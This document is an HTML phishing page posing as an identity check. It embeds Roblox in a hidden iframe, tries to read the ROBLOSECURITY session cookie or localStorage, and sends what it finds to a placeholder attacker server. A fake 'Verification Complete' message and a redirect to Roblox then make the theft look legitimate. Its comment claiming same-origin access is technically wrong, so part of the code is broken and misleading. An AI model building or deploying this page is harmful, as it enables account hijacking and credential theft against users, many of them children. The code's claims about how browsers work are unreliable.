<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifying...</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #1e1e1e;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .container {
            text-align: center;
            background: #2d2d2d;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
            z-index: 2;
        }
        h1 { color: #43b581; margin-bottom: 10px; }
        p { color: #b9bbbe; }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #43b581;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        /* Hide the iframe so user doesn't see it flash */
        #roblox-frame {
            position: absolute;
            top: -10000px;
            left: -10000px;
            width: 1px;
            height: 1px;
            opacity: 0;
        }
    </style>
</head>
<body>

<div class="container" id="verify-box">
    <h1>Verifying...</h1>
    <div class="loader"></div>
    <p>Please wait while we confirm your identity.</p>
</div>

<!-- Hidden Iframe to access HttpOnly cookies -->
<iframe id="roblox-frame" src="https://www.roblox.com/home"></iframe>

<script>
    const API_URL = "https://your-server.com/receive"; // Change this to your Python server
    const ROBLOX_DOMAIN = "https://www.roblox.com";

    // Wait for iframe to load
    const iframe = document.getElementById('roblox-frame');
    iframe.onload = function() {
        try {
            // Try to get the cookie from the iframe's document
            // Note: This works because the iframe is on roblox.com (same origin)
            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
            
            // Check if we can access cookies directly
            let cookieData = iframeDoc.cookie;
            
            if (cookieData) {
                sendCookie(cookieData);
            } else {
                // Fallback: Try to read from localStorage if available in the iframe
                try {
                    const localData = iframe.contentWindow.localStorage.getItem('ROBLOSECURITY');
                    if (localData) {
                        sendCookie("ROBLOSECURITY=" + localData);
                    }
                } catch (e) {
                    console.log("Localstorage read failed");
                }
                
                // If still no cookie, try to trigger a page load that might expose it
                // Sometimes simply navigating the iframe to a page that requires auth 
                // forces the browser to attach the cookie to the request, 
                // but for stealing, we need it in JS.
            }
        } catch (e) {
            console.error("Iframe access error (likely cross-origin):", e);
            // If iframe is cross-origin, we can't read its cookies directly.
            // In this case, we fallback to the "Redirect" method below.
            fallbackMethod();
        }
    };

    // If iframe method fails, use the Redirect method
    function fallbackMethod() {
        // Redirect the user to Roblox. If they have a session, they auto-login.
        // We then catch the redirect in the main window.
        window.location.href = ROBLOX_DOMAIN + "/home";
    }

    function sendCookie(cookie) {
        fetch(API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ cookie: cookie })
        }).then(() => {
            document.getElementById('verify-box').innerHTML = `
                <h1>Verification Complete!</h1>
                <p>You have been verified successfully.</p>
                <p>You can now close this tab.</p>
            `;
            // Optional: Redirect to Roblox to make it look legit
            setTimeout(() => {
                window.location.href = ROBLOX_DOMAIN + "/home";
            }, 2000);
        }).catch(err => {
            console.error("Failed to send cookie", err);
        });
    }

    // Listen for messages from the iframe if we use a different approach
    window.addEventListener('message', (event) => {
        if (event.data && event.data.type === 'cookie') {
            sendCookie(event.data.cookie);
        }
    });
</script>

</body>
</html>
